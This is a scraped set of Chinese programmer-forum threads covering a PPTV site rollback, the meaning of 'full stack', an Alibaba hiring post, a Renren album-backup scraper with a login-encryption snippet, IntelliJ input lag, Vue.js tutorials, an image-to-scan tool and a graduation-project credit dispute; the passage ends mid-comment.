{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img alt=\"\" src=\"https://ws1.sinaimg.cn/large/6c2ea0fbly1fefjnuz9vvj20zb0rbtbc.jpg\"></p>\n<p><img alt=\"\" src=\"https://ws1.sinaimg.cn/large/6c2ea0fbly1fefjnx22b3j20y80qt0v7.jpg\"></p>\n</div></div>"], "reply": "14", "tittle": "PPTV 网站这是线上自动部署的版本库被回滚到六年前了？", "comment": ["一嘴老血", "已回复正常\r", "\r", "之前这个状态 包括 5 个二级子域名都是 持续了至少 5 分钟\r", "\r", "另外 有些 2011 年还不存在的分类正常……", "有点意识", "潘金莲 性欲熏心 🐸", "哈哈，我前几天也看到了 不过恢复的很快", "以前遇到过 ", " 网址后面加 /?随机字符就好了", "pptv 自从离职潮之后...", "现在还有人上 pptv?", " 中超和亚冠版权在它那边，看球的不得不上，之前乐视清晰度，包括赛后节目视频都秒 PPTV 。\r", "还有西甲也是不行，但西甲可以看国外。", "技术渣得跟国企一样，经常直播看不了，还搞垄断版权，没有金刚钻，就别揽瓷器活", " 人民的名义网络独家版权在 PPTV", " →_→不是吧，我看哪个网站都有，为什么不直接在芒果 TV 看", "6 年前的版本都还在，而且部署出来，也是挺厉害的。", " 网络版权是他们买的，一般情况下，可以授权别家视频网站转载，只不过别家要付费"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>随着 facebook 整出全栈这个词儿，发现最近好多人会一门前端+一门后端就可以说自己是全栈；所以向问问大家对全栈是怎么定义的？</p>\n</div></div>"], "reply": "84", "tittle": "会一门前端+一门后端就全叫 \"全栈\" ？大家心中有没有全栈？", "comment": ["全栈是什么,从业快十年了我的简历和介绍里从来都没用过精通这类词", "只有“全干”。", "能把公司某个主要业务的技术栈都搞通就算啊。", "百度百科：\r", "全栈工程师，也叫全端工程师(同时具备前端和后台能力)，英文 Full Stack developer 。是指掌握多种技能，并能利用多种技能独立完成产品的人。", "小公司打杂的都这么干，写前端，写后端，设计数据库，部署，运维。\r", "嗯，全栈。", "这样看，我们公司全部技术都是全栈工程师。因为我们公司用 Vue 和 Laravel 写代码，一个人要完成一块功能。\r", "\r", "但是提起工资 ... 只有一个心酸的数字。", "架构师的逼型产物", " 我现在也是看到全栈这个词很怕很怕唉", " 这解释我感觉很合理\r", " 但是我感觉大公司这种血牛逼的真正的啥都玩的转的还是有的，不过是稀有品种", "爱叫什么叫什么，你爱叫自己什么就叫自己什么，无非一个定位。我之前就偶然看到一个文章里面写一类人是团队里面的“ go to guy ”，就觉得很犀利。然后我就觉得我在工作前 3 年能成为这样的一个人就好了。我不是前端，也不是后端，也不是全栈。我就希望自己是“ go to guy ”，我就希望自己是问题解决者(problem solver)。", "全栈一点不稀奇，是我们把这次想得太玄乎了。\r", " ", "  \r", "我理解的全栈就是，给出一个完整的需求（比如一个简单的动态 blog ），你是否有独立完成全部功能的实力（最好带上发布）。", "有点感觉 。。。全栈 越来越是一个贬义词了", " 我感觉也是这样\r", " 这个我个人感觉确实有这种趋势，反正谁跟我说他是全栈，我就会合计合计这人靠谱不", "和精通一个意思吧", " 我可以 ，但是我不觉得自己是全栈。。。", "跳出业务谈技术都是耍流氓。。", "Full stack = website backend + website frontend + desktop + mobile + cloud\r", "\r", " 这只是一个描述开发者技术领域的名词，不知道何来褒贬之分。难道你一直以为这个词很高大上？", "产品经理+视觉设计师+交互设计师+开发经理+项目经理+开发工程师+前端开发工程师+数据库工程师+数据分析师+服务器运维+产品运营等产品一条龙。", "我这样算不算全栈？服务端比较熟悉，前端和运维只能说会用一点。\r", "\r", "主力语言是 Java/Kotlin/PHP 和 Python/Go ，大部分时间写服务端，从 OS 底层到数据库都很熟悉。\r", "\r", "管理后台只要能用就行，所以也会顺便写点业余的 html 和 js ，不可能找个前端一起做的，\r", "CSS 我只会套 bootstrap 的几个类，要我自己写是完全不会。为了解决 js 语法丑陋，我学了 CoffeeScript ，\r", "为了双向绑定，我又学了 vuejs ，常见的 js 库基本上也都会用。\r", "\r", "我项目只有不到 10 台机器，所以运维和部署的工作，也会顺便做点，虽然也比较业余，\r", "我会用 fabric 写点自动化运维脚本，也能弄点简易的监控和集群。\r", "\r", "以前在小公司做的时候，有很多项目是我从零开始，前后端都是我搭，有疑难杂症也是我解决的。", "装机+剪网线整路由+装各式系统(win/linux)+搞定各大云服务器+N 个公司内网服务器+mysql/ldap/redis/postgresql/iis/nginx/apache/samba/gitlab/iptables 配置+3 套语言后台+N 个前端插件+N 个内部系统开发+经常和客户会议+面试招聘+偶尔进行遣散活动\r", "\r", "这不叫全栈，这 tm 叫苦逼……", "从需求沟通到项目交付，都能独立完成，谓之全栈。", "这些年互联网的火爆逼得一个人必须掌握多种技能，于是就有了「全栈」", "小心栈溢出。。。", "前端+后端顶多算“全站”，不是“全栈”\r", "这概念是相对来说的，做个个人网站自己完全个人完成也能叫全栈，但是跟一些大项目相比这个全栈只能算个元素", " 招人的时候怎么面试会计出纳是个问题", "全栈就是全干......", "从开发到部署到运维到辞职。", "上次看到一个三线城市招收全栈的要求，要会多种后端语言+前端牛逼+云架构。唉哟哟，这么写对得起你们开出的 4k 工资吗？", " \r", "\r", "面试会计出纳有啥难的……\r", "\r", "大学里又不是没学过……何况我老婆还是干这个的……\r", "\r", "前台，设计，销售我都面过……", "基本上都是“全干”", " 还有“全沾” 😂", "给任何需求，这个人能独立搞定。这叫全栈。\r", "给任何需求，这个人说我只会 XXX ，这个搞不定。这不叫全栈", "就是一个 handyman", " 还要 Android 和 iOS 这俩基本的 app 开发，最好还能有桌面应用", "我觉得全栈是“全沾”本来就是合理的。\r", "一能在需要的时候独当一面 单独完成某个任务；\r", "二能在出现问题的时候 能解决或者提供思路促进解决；\r", "三能协调各种职位工作提高效率。\r", "看起来好像这三样很厉害超牛逼 但是其实很泛 完成功能大功能小功能？ 解决问题 大问题小问题？ 还是得结合业务实际。\r", "大公司容易培养出专家，小公司就容易出这种人 特别是小公司创业公司的技术负责人 从接网线到上线全得干 一边负责整体布局 一边还得帮下面处理篓子。", "打杂的飘过……", "Full-StackOverFlow Engineer ？", "当个喷子，嘲讽两句。\r", "\r", "往往技术越不行，或者性格越偏执越容易纠结这些事。全“栈”工程师又名全干工程师。\r", "\r", "小公司 JD 上写着招全栈工程师，其实就是要你做需求分析、数据库设计、写前端后端，从需求到发布整个过程走一遍。总不能 JD 上写着“招 前端+后端工程师”吧。\r", "\r", "小公司有小公司的玩法，大公司有大公司的玩法，大公司不可能让你一个写接口的去给他们搞运维去。\r", "\r", "回到题目，看别人说的：从计算机网络及安全、计算机硬件、操作系统及组成原理，到底层语言，再到上层高级语言都能搞的比较明白的人。\r", "\r", "这种说法也是 too naive ！程序员这方面发展有两种：广度和深度。上边的说法就是广度 + 深度。当然，非术业内的也需要了解基本原理。\r", "\r", "再比如说，我生活中没见过谁自称自己是全栈工程师的。简历上可能会写，但是大家看到笑笑知道这个人以前在公司都做啥的就行了，没那么多纠结的。", "我除了 c#其它都会", "Can solve any problems in programming!", "刚刚花了点时间，写了一点关于全栈的看法，献个丑  ", "我的理解是，给你一个需求，你一个人可以把产品搞出来并上线，就算是全栈了\r", "别纠结几门语言，哪个程序员不懂几门语言啊", "我是个计算机专业的艺术特长生, 跟一个微型公司关系不错, 经常帮他们做一些奇奇怪怪的事情:\r", "一开始是他们公司是学校采购商, 当时兴什么创客, 代理买了个什么导电膜水, 让我画个画, 好我画. 还有什么触摸钢琴没人会弹好我弹.\r", "几乎同时, 学校购买了一堆 Arduino 的东西, 让他们提供技术支持, 写个简单的 Arduino 程序什么的, 我就帮他们写了.\r", "然后他们发现很多\"开源硬件\"很好赚钱, 就问我会不会做电路, 于是我就帮他们 Layout PCB, 做各式各样的模块, 写各式各样的库.\r", "3D 打印技术兴起, 修了不知道多少个 3D 打印机之后可以自己设计制作 3D 打印机(还会简单的建模)了...\r", "之后发现想法很多, 想做一些市面上没有的电子制作, Arduino 不方便做成商品, 我又给他们搞 AVR/Microchip 单片机和模拟 /数字电路.\r", "再以后, 他们的一个硬件需要 App 控制, 我就用 Qt 写了 Windows/Mac/IOS/Android/Ubuntu 客户端...\r", "没过两天, 他们又要与服务器通讯, 推送数据什么的, 然后我就用 Apache+php+mariaDB 捣鼓了个数据库...\r", "之后就说有了服务器为啥不弄个官方网站呢? 于是就拿 WordPress 扒了个皮仿了个站...\r", "再之后网站改啊改, 无意间发现了前后端通吃的 js, 本来脑子就不够使的我抛弃了 php, 正在用 nodejs 重写了.\r", "期间还不断穿插: P 图(GIMP), 写 bash(WSL 批处理), python(刷票, 爬数据), excel(报表宏), 写众筹文案, 运维(网站 /应用数据 /NAS/梯子 /svn/VPN), 微信公众号, 淘宝, 甚至修手机电脑(元件级)之类的...\r", "如果网页前 /后端+运维就算全栈, 我 TM 算个啥...\r", "\r", "Q: \"你说了这么多, 全栈到底是个啥?\"\r", "A: \"样样都会,样样不精.\"", "  反正我是从嵌入式到前端什么都干了，就是不精", "这问题没人敢答，答了之后肯定会被喷，“什么，你连电子电路元器件都不知道还敢称全栈”", "从电路，机器语言， cpu 内部指令集，硬件微程序，汇编，高级语言，软件，算法，网络（包括 tcp ip ， RFC 文档，数据安全加密通讯等），前端，数据库这些一条龙服务，才称得上全栈", "时代在进步，现在不流行“我们公司就差一个程序员”，“我们需要全栈工程师”", "只能默默的看你们装 B", "全干", " 我同意这个观点，技术为实际用途服务。", "全占 全战 全干", "打杂工程师", "前阵子面试了一个人，他在写 html 的时候写了类似 <link src=\"style.css\" />的东西， 指出他的错误以后他说：“我对 css 不是那么熟悉，我更多是全栈。”", "从前台到中层到后勤都“干”过，从前到后，俗称“全干”。（送盒肾宝）", " 感觉来源于给别人打上这一类标签的人，比如有招聘全栈的工作,招聘更多的是考虑到想以更低的成本做到满足到自己的最低的要求，如果以全栈的工作时薪来计算，我想的是大部分都不会比 专栈 的高。", "全栈？\r", "就是：\r", "- hey ，我们有个需求，能去支援一下吗？\r", "- 好，我去解决。", "我见过不少“全堆工程师”... 所有的代码都是 Google GitHub StackOverflow 得到的片段堆起来的。至于全栈，也许比全堆好一点", "全栈就是拿一份工资，干几个人的活。", "全栈是纵向的，又不是横向的，会一门就够了。但肯定不止前后端各会一门语言这么简单。", "什么全栈？其实都是全沾。", "不是只写前端代码，或者只写后台服务。这个不叫全栈的话，应该叫什么？", "如果是 JD ，月薪没有写到 50K 以上的说要全栈就是扯鸡巴蛋。\r", "如果是自吹，月薪没有领到 100K 以上的也是扯鸡巴蛋。\r", "\r", "这个词，最早说到某个人的时候，好像是说的豆瓣的阿北。那么，阿北的身价是多少呢？", " 我还设计过数字芯片，手工焊电路。我这样算全栈吗？⁄•⁄ω⁄•⁄ ⁄)⁄", "全干巴", "一人全干", "在小公司, 全栈就是全干, 然后最要命的是全干还是只给单干的时间...", "APP 前端 后端 运维 产品", " 还有测试", "越扯越离谱了，感觉再扯下去要开始提炼单晶硅，手刻光盘了...", "你这是在怀疑我咯？要不咱们出去过两招，让你知道什么叫拳战！", "叫 web 开发工程师 就行了吧", "![", "]( ", ")\r", "来源--> [", " ", ")", "我记得掌握从单晶硅的提炼到 app 上线才能称为全栈", "stackoverflow", "我自己的标准是.. 能对各层的技术栈融会贯通, 能从页面出错不间断地跟到数据库.", " 妥妥的没毕业就买车养女友了", "之前看到一个段子，全栈不仅会前端后端数据库，还要从沙子里提取纯硅到制作 cpu....等 ，一条龙.....", "每次别人问我，我都给他看这张图片： ", " \r", "从部署服务器、搭建服务、后台、数据库设计和维护， API 、网页和客户端，都能干并且中间任意一个环节出问题了，都能快速定位和解决，我觉得就是一个合格的全栈了。不过我觉得现在普遍意义上全栈就是指前端和后端。", "全栈不就是科班软件工程师么。\r", "哪个科班出来不会自己做一套简单读写删改的应用？\r", "国内叫做前端，互联网发展前期被当作是切图而已。", " network 在哪里...", "前不久我写了共享单车的前后端程序，并且用三维打印机制作了一副定位电动马蹄锁，用 Keil 写了单片机跟定位模块的控制代码， proteus 设计了电路，改装了 2 辆自行车……往街上扔了两天，然后就丢回自家车库积灰了。早知道今天，就不搞这些破技术了，还不如拿着钱炒个房。", "就是全栈都全赞！", " 不是我吹。小规模纯数字芯片设计全流程我是可以 Hold 住的。设计，综合，时序约素， STA ， layout ，后仿。 (｡・`ω´・)"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我们是阿里商家事业部技术团队，负责淘宝、手淘、天猫阿里电商系，所有和商家相关的业务和系统，包括店铺、图片、商家多媒体平台、开放平台、聚石塔 TAE 、千牛、旺旺、御膳房、商家大数据平台，电商云等业务，我们招聘 2~8 年经验的开发工程师，有互联网和企业级软件开发经验最好（语言包括但不限于 Java 、 C++、 Go 等）在我们团队，接受互联网界最好的技术成长氛围和最前沿的业务和技术，协助你快速野蛮的生长，感兴趣的同学 q 我： 785764122 ，或邮件 changchun.wzj@alibaba<a href=\"http://-inc.com\" rel=\"nofollow\">-inc.com</a></p>\n<p>工作年限： 2-8 年\n等级： p6-p7\n工作地点：杭州\n语言：主要从事 java （愿意转 java 的 ok ）</p>\n</div></div>"], "reply": "4", "tittle": "阿里商家事业部技术团队招聘 Java 工程师", "comment": ["常春 :)", " 被你发现了", "997 ？", " 正常上班"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>发现人人网死了好久，于是写了个简单的爬虫把想要的相册都全部爬下来，顺便将代码开源，希望能帮助到大家。</p>\n<p><a href=\"https://github.com/XueSeason/renren-album\" rel=\"nofollow\">https://github.com/XueSeason/renren-album</a></p>\n<h2>使用方法</h2>\n<pre><code># 登录操作\n./app.js -l -u 49****94@qq.com -p *****\n\n# 下载本人相册\n./app.js -d\n\n# 下载指定用户 id 相册\n./app.js -d -i 4413**450\n</code></pre>\n</div></div>"], "reply": "55", "tittle": "人人网可以死，当初的回忆不能死，爬取人人网相册", "comment": ["人人网死了？", "因为人人网必须注册才能访问，所以从来就没注册过。", " 人人快死了。", "懒得注册+1", "我的相册都是黑历史 早就被我删掉注销了", " 半死不活了吧", "试用了下，挺好用的，只是莫名中断了几次，然后只能从头重新下载。。。感觉可以维护一个 json 存下哪些已经下载了，断了就不用重下了。然后异常是不是没捕获全，所以才挂了几次。总体还是挺不错的，给 Star 。", " 因为是快速做出的小 Demo ，并没有考虑太多因素。后面我会慢慢完善的。还是非常感谢。", "赞~我去研究下 LZ 的代码", "。。当初 还玩得多 人人有很多有趣的故事 能爬吗", "前几天还登陆过，杳无人烟……", " 理论上，模拟登录后，只要你能看到的，基本都可以爬。目前我只是觉得相册这一块比较重要，其实也可以爬动态。", " 谢谢，如果你能研究出其他的玩法，欢迎 PR", "强烈支持，能否把动态爬下来", " 芭莎娱乐公号发文\"人人网将关闭\" 被判赔 2 万余元 ", " 祝楼主平安", "刚登录下人人，找了点回忆", "很早已经已经用脚本，删掉了所有信息，然后弃用了，因为没法注销。", "技术改变生活", "上同学，找人人", "请问怎么开启？ Windows 里我用终端执行命令会报错。", " 还有多久？这就挂了啊", "我写过一个大规模人人爬虫程序， 一个建议不要使用混淆的代码，登录这一块使用的 RSA(非标准)对密码进行加密， 密钥的长度 256.\r", "\r", "class RSAPubKey:\r", "    def __init__(self, exponent, modulo):\r", "        self.exponent = self.encode(exponent)\r", "        self.modulo = self.encode(modulo)\r", "\r", "    def encode(self, data):\r", "        return int(data, 16)\r", "\r", "\r", "class RSAEncrypt:\r", "    def __init__(self, key):\r", "        self.key = key\r", "\r", "    def encrypt(self, text):\r", "        text = self.encode_text(text)\r", "        cipher = self.fast_exp(text, self.key.exponent, self.key.modulo)\r", "        return format(cipher, 'x')\r", "\r", "    def debug_bignum(self, num, prefix):\r", "        print(\"==> %s <%s>\" % (prefix, format(num, 'x')))\r", "\r", "    def fast_exp(self, base, exponent, modulo):\r", "        result = 1\r", "        if exponent == 0:\r", "            return result\r", "        while exponent > 0:\r", "            if exponent & 1 == 1:\r", "                result = result * base % modulo\r", "            exponent /= 2\r", "            base = (base * base) % modulo\r", "        return result\r", "\r", "    def better_hex(self, num):\r", "        while num > 0:\r", "            pass\r", "\r", "    def encode_text(self, text):\r", "        if isinstance(text, int):\r", "            return text\r", "        result = 0\r", "        for c in text[::-1]:\r", "            result = result << 8\r", "            result += ord(c)\r", "        return result\r", "\r", "if __name__ == '__main__':\r", "    expect = \"24cf15330c44dae8846d386b97be97b278b42b2e54894c16dd682a8046c99bd8\"\r", "    exponent = \"10001\"\r", "    modulo = \"8cf5d22c6857c041a50947cf178b1519d5ab7befe7e523a0c93220c0a44593a9\"\r", "    key = RSAPubKey(exponent, modulo)\r", "    rsa = RSAEncrypt(key)\r", "    cipher = rsa.encrypt(\"helloworld\")\r", "    print \"cipher: %s\" % (cipher)\r", "    print \"expect: %s\" % (expect)", "我之前也写过一个类似的东西，不过是爬某个好友的状态和图片...\r", " 前几周换了接口，你这个应该无法登录了", "好使，感谢！", " 没测试过 Windows 环境，其实只要稍微改下 app.js ，在 windows 下也是可以跑的。", " 因为抓包的时候，不太确定这个加密过程是 RSA 。请问你是如何得知的？", "注册要巴拉巴拉好多东西", "还有一个开心网 也快死了吧", "注册过人人网最烦的就是会被大街网骚扰，都是千橡旗下的，资料通用。\r", "根本没注册过大街网，还是会经常收到邮件“某某，你有一个职位邀请，点击查看”，点开就是个注册页，根本没有职位邀请。\r", "\r", "话说前些天还收到大街网阴魂不散的垃圾骚扰短信，“ XXX 公司招聘负责人亲自给您发了一封职位邀请，可优先面试，接受： d-j.me/xxxxxxx 回复 TD 退订”", " 人人没法完全注销，注销了还可以重新启用", "是大图吧？", " 反正黑历史删光了 无所谓（摊手", " 研究了很久，没用过 node js ，搞起来太吃力了。。", " 看参数名字 e 、 m 这种事 RSA 才会使用的", " 壮哉我大 python ，我还是研究这个代码吧。", "人人网注册过但没有进去发过一次。\r", "不过人人网的确应该提供备份。\r", "\r", "学 FaceBook 结果自己死了。\r", "感觉好可怜。", "一直纳闷一个问题,为什么移动互联网时代,没有一家校园社交做得好的公司,校园社交到底是不是伪命题", "为什么我怎么折腾都会报这个错……", "‘’‘\r", "module.js:472\r", "    throw err;\r", "    ^\r", "\r", "Error: Cannot find module 'commander'\r", "    at Function.Module._resolveFilename (module.js:470:15)\r", "    at Function.Module._load (module.js:418:25)\r", "    at Module.require (module.js:498:17)\r", "    at require (internal/module.js:20:19)\r", "    at Object.<anonymous> (/Users/nevin47/Downloads/renren-album-master/app.js:6:17)\r", "    at Module._compile (module.js:571:32)\r", "    at Object.Module._extensions..js (module.js:580:10)\r", "    at Module.load (module.js:488:32)\r", "    at tryModuleLoad (module.js:447:12)\r", "    at Function.Module._load (module.js:439:3)\r", "‘’‘", "同 LS ，我忘了 node 怎么用了，是不是先要执行什么安装命令？", " npm install", " 首先要安装好最新的 node 环境，注意版本要求。然后进入项目，执行 npm install", " 就是，腾讯的朋友网也是半死不活。", "后悔人人账号注销了，找不回相册了", "\r", "这个也不错。", " 重新登陆就可以了，人人网不删数据的", " 果然可以重新登录，感谢，不过好奇注销账号它是怎么注销的", "  今天刚刚收到人人的广告邮件。 人人直播， 看到上面的妹子一张张网红脸....", "这个下载别人相册时需要权限么？", " 有权限查看的照片都能下载到。没有权限的当然没办法。", "人人死不了，人家改做互联网金融了，股票大涨很多了", " 噢，没涨，只是调整 ADS 和 A 类股的比例了", "password 中有括号的时候报错。。", " 可是尝试在 Shell 中用引号。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Macos Sierra 10.12.4</p>\n<p>型号名称：\tMacBook Pro</p>\n<p>型号标识符：\tMacBookPro13,3</p>\n<p>处理器名称：\tIntel Core i7</p>\n<p>处理器速度：\t2.6 GHz</p>\n<p>处理器数目：\t1</p>\n<p>核总数：\t4</p>\n<p>L2 缓存（每个核）：\t256 KB</p>\n<p>L3 缓存：\t6 MB</p>\n<p>内存：\t16 GB</p>\n<p>intellij idea 2017 最新版的</p>\n<hr>\n<p>换了新款的 mac 突然发现 intellij idea 用中文输入法打中文的时候超级卡。打完字后一个一个蹦出来。太恶心了。</p>\n<p>试了 给 ide 更改内存，禁用 git 插件，更换输入法（比自带的稍微号一点）</p>\n<hr>\n<p>大家有遇到这个问题吗，老款 mac 从来没出现过这个问题。</p>\n</div></div>"], "reply": "17", "tittle": "MacBook Pro (15-inch, 2016) 用 intellij idea 写项目 用中文的时候超卡", "comment": ["JetBrains 家的 IDE 输中文都很卡，我都改用英文注释了，或者有一个 power save mode 可以试试，不过这样也就没语法补全了。", "  谢谢您。", "不卡啊？这个现象普遍吗？\r", "\r", "同 10.12.4 ， 2016 款 15 寸低配， Intellij idea 2017 最新版", "我也这样子，烦", "如果你用 PowerPoint 的 smart art 也这样，感觉可能是自带输入法的锅", "10.11.5\r", "JB IDE 内存占用默认是 750MB 没改\r", "用中文 偶尔出现楼主说的问题", "一种卡是因为 JB IDE 一直在不停的给你的文件，改动的文件，创建索引和 history ，导致占用内存慢慢的增加，设置里可以排除不需要创建索引的目录和文件，但大项目随着不停的修改文件，内存依旧会增加。\r", "\r", "非固态硬盘的 iMac 用 JB IDE 简直卡爆", "换 vscode 试试", "可以到 系统偏好设置->安全性与隐私->FileVault 里面，关闭 FileVault 试试", "一样的情况。偶尔重启解决很快又出来了……对了， Mac mini 2011", "我的神船都不卡", "我的是 2016 款 15 寸 高配，系统默认中文输入法，但是只有在电池快没电的情况下用 JetBrains 家的编辑器打中文才会卡\r", "\r", "楼上有提到关闭 FileVault ，但是我的 FileVault 一只都是开着的\r", "\r", "推荐使用 JetBrains 家的 Toolbox 来安装 IDE ，可能是 IDE 的版本的问题？我的已经全都是 2017.1.1 了", "12 年  MacBook Air I5 1.8.     4G.   \r", "\r", "从来都没有这现象，而且平时工作都是 safari chrome Idea Datagrip 这些同时使用！ 用清歌输入法\r", "\r", "所以怀疑是设置问题！", "请用 homebrew 安装，我以前也有这问题，重新用 homebrew 安装后就好了。", "我也是 15 2016 偶尔出现，感觉很奇怪。", " homebrew search 看了下 只有 2016 版的 \r", "\r", "我安装一下看看", "上船的优势就体现了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>分享一系列精品热文</p>\n<p><a href=\"https://www.qcloud.com/community/article/430630001490779316?fromSource=gwzcw.84430.84430.84430\" rel=\"nofollow\">包学会之浅入浅出 Vue.js ：开学篇</a></p>\n<p><a href=\"https://www.qcloud.com/community/article/437519001490856733?fromSource=gwzcw.84429.84429.84429\" rel=\"nofollow\">包学会之浅入浅出 Vue.js ：升学篇</a></p>\n<p><a href=\"https://www.qcloud.com/community/article/560608001490929432?fromSource=gwzcw.84428.84428.84428\" rel=\"nofollow\">包学会之浅入浅出 Vue.js ：结业篇</a></p>\n</div></div>"], "reply": "55", "tittle": "包学会之浅入浅出 Vue.js", "comment": ["nice", "收下了", "先收藏", "jQuery 脱离了热点了几个鬼，都是你们搞的，现在想找个能安安静静写 jQuery 的人比以前更难了。。", "留住，待会再看", "哎，现在是个前端都会点 Vue/React", "作为后端表示\r", "老子就是要写 jquery ！你咬我啊！", "正好昨天开始看 Vue.js 。。。感谢感谢", "现在作为后端也要会点 Vue 之类的~", "先收为敬", "顶", "收藏", "收下 谢谢", "先收藏为敬", "mark", "我一个后端，就是因为熟悉 angular/vue 拿到 offer ，想起来都心塞", "mark", "马克", "马克", "mark", "nice", "mark", "mark", "mark ，后端的表示早就撸起来了", "mark ，赶紧撸起来", "MARK", "good", "不用 npm/nodejs 能使用 Vue 吗？我就想码几个网页，像 jQuery 、 bootstrap 那样简单添加不行吗？？", " 可以的，就当做一个双向绑定库就可以了", " 可以直接 src 引入", "借楼和大家说一个自己遇到的坑：\r", "computed 属性在依赖的数据变化后，访问这个属性时自动会调用 computed 里面的 getter 进行更新。但如果自己加了依赖数据的 watch 并在其中对那个属性进行了显式赋值，然后就会造成重复调用属性的 getter ， getter 计算比较复杂的话就会造成异常卡顿", " \r", " \r", "多谢解疑，之前看到的 vue 的教程都是用 npm 的，还以为必须用 npm 才行呢，，查查不用 npm 的去", "mark", "不错。", "比 吖哩 不知道高多少，收藏。", "mark", "mark", "有点复杂，还是 jquery 好懂", "没人拦着你用 jQ ，只要你后期愿意维护就行", "收下来看看  谢谢楼主", "谢谢", "马克", "mark", " JQ 挺好的， Vue 也挺好的。另外这教程其实挺水的，还不如看官方文档，叫好的是水军？", " 我和好多同学推荐官方文档，但是他们还是自己找视频找书看", "mark", "明明有收藏功能为什么一直在 Mark ？", " \r", "其实官方文档确实不错，但是那里的实现感觉刚刚看的人有点晕，不如直接提刀上马，干一波看看别人的整体 demo 再查文档。", "现在 vue.js 真是火啊，各大社区全是各种新手入门文章，但是最佳实践，实战项目的教程实在是太少了，希望能多多出一些这方面的教程，或者 vue.js 源码解读系列也可以。", "升学篇中的:  \r", "\"会将 img 整个替换掉组件中的对应 name 的<slot>标签\"\r", "\"整个替换掉\" 应该是 \"整个替换到\" 吧", " [还有一点必须要知道的是， Vue 是国人写的，技术文档也妥妥的是中文，想到这我就有学习的动力。] 你确定文档是中文吗？", "mark", "mark  已感谢", " ,其实实战项目网上也是有的，如果可以，改天我试着写点实战项目出来，为社区、为开源做贡献，心情挺不错的", " 这个问题我也遇到了，另外，我个人的总结是， Vue 这东西用的时候，在设计上，一定要避免在任何一个 compute ， method ， watch 中处理太复杂的逻辑，否则就卡，如果逻辑太复杂了，就异步吧"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img alt=\"\" src=\"https://github.com/idf/scanify/raw/master/demo/demo.jpg\"></p>\n<p>用法</p>\n<pre><code>Usage:\n  scanify &lt;path&gt;\n  scanify &lt;path&gt; -o &lt;outpath&gt;\nExamples:\n  scanify '/path/to/image.jpg'\n</code></pre>\n<p>安裝</p>\n<pre><code>pip3 install scanify\n</code></pre>\n<p>之前有个 Photoshop 的方法，但是有时候并没有 Photoshop ，就直接上 Python 搞下图像处理好了👌。</p>\n<p><a href=\"https://github.com/idf/scanify\" rel=\"nofollow\">https://github.com/idf/scanify</a></p>\n</div></div>"], "reply": "11", "tittle": "没有扫描仪，把照片处理成扫描文件 - Scanify", "comment": ["有没有从效果上能反过来的...\r", "把看起来像扫描的文档（或者干脆就是 PDF 文档）处理成像是照下来的那样的", " 你這個腦洞有點大？什麼 Use Case 呢", " 因为在做一些课堂 pre 的时候，引用一些书籍文献直接摆一句话上去感觉太平淡了，后来看了柴静的《穹顶之下》，那里引用一本书的结论时左侧放了引用页的照片，右侧是具体的文字，感觉效果很好…", " PS ……", " 还有光影魔术手一类的。。。", " GIMP ……", " 扫描件那是限于版权啊有效性啊啥的考虑才弄的，要论美观自然还是照片", "扫描全能王", " 我記得微軟也出了個 office lens 。", "可否自动修正整形失真呢", " 具体？"]},
{"content": ["<div class=\"topic_content\">楼主在做毕业设计，毕业设计是要看 github 代码贡献值算分的，四个人一组。\r<br>\r<br>一开始大家都不太会用 git ，于是我建立了 repository ，并且把队友们都添加好，但其中一姑娘说 github 账户有问题，她说根本看不到，于是我把做的东西传到了网盘里，让她也可以看一下代码。又过几天发现她自己建了个 repository ，并且把我们都添加了进去，我以为她 git 不太会用，自己又乱搞出来了一个，就没多理。\r<br>\r<br>上周发现除了我没有人在 git 上传代码，跑去问大家代码敲的怎么样了，得知这姑娘已经把她的地址交到了学校那里，大家都把代码传到了她那里，她解释说她还是用不了我的，就用她自己的吧，反正都一样，这些都无所谓。\r<br>\r<br>今天发现她把我辛苦敲的代码都 commit 为她自己的，很理所应当的样子，然后说反正也这样了，也改不了了，她也没办法，总不能删了让大家的记录重来。我本想自己活该，一开始就不该传网盘…那就自己再多做一些吧，就当送她了。但今天她去找老师报告，拿出 commit contribution 那个图，说全组就她在做事情，我和其他人都做的很少。我去找老师谈，说让我自己解决，因为我一开就不该上传到网盘。\r<br>\r<br>请问各位大神，有没有什么补救的办法，能在 github 上显示之前的东西是我做的之类的？跟老师谈过了，跟她谈过了，另外两个队友也表示同情，但是也没什么办法。</div>", "<div class=\"topic_content\">没想到收到这么多回复，首先感谢大家的关注和建议。\r<br>\r<br>后续来了：我觉得不管是 DMCA 还是 DCMA ，都不是解决问题的办法，这根本就不是一个技术问题，更何况会影响到另外两个无辜的队友，如果她想继续搞事情，能有一百种不同的办法。\r<br>\r<br>所以直接去找她谈了，直接说代码是我的，你不能这么干，我只想要回我那一份，她说谁让你传网盘啊，现在大家代码都混在一起了怎么分？言外之意你传了网盘，没证据。\r<br>\r<br>我又说不想多要求别的，我只想要回我那一份，我传的记录更早，已设为 private 了，你看不到。她是很聪明的人，立刻就认怂，表示代码都是我的，如果没有我的代码她根本没做多少。\r<br>\r<br>当然楼主没那么傻，先给了她个台阶下，说如果需要帮助你可以找我。但是，你得删掉我的代码，并且你要拿你的账号发个 issue 或者写在 readme 里，说明这部分是我的。\r<br>\r<br>已保留所有证据，如果不照做就发老师。\r<br>\r<br>\r<br>实在不敢发地址，首先是 private ，而且就算 Public 也不敢发，怕有观光团，这样影响的不只是她一个人，还会伤害到其他成员和我自己。\r<br>\r<br>此女不简单，执行力强且反应快，日后必成大器啊！（手动滑稽 :p ）没必要弄到撕破脸皮，自己心里知道是什么样人了就好，还有一大段时间大家会在一起完成这个项目，撕破脸皮不太好，自己长教训了就得了。\r<br>\r<br>再次感谢大家的关心！</div>"], "reply": "180", "tittle": "心机队友拿我的代码当自己的去上交，还举报我做得少。", "comment": ["。。。怎么会有人想着忍忍不计较就好，是他们本人太包子还是他们平时喜欢像楼主说的女生那样子占别人便宜？自己的权益不自己争取，谁帮你争取", "看到楼主说不要“撕破脸皮”，真是幼稚。还是学生吧\r", "\r", "你这次忍了，下次她更狠，不如送她出局。", " 当年我们是要求用 git 的。。 4 人一组 4 个 role ， frontend, backend, database & team leader ，美国大学很多都这样吧", "成大器个 P 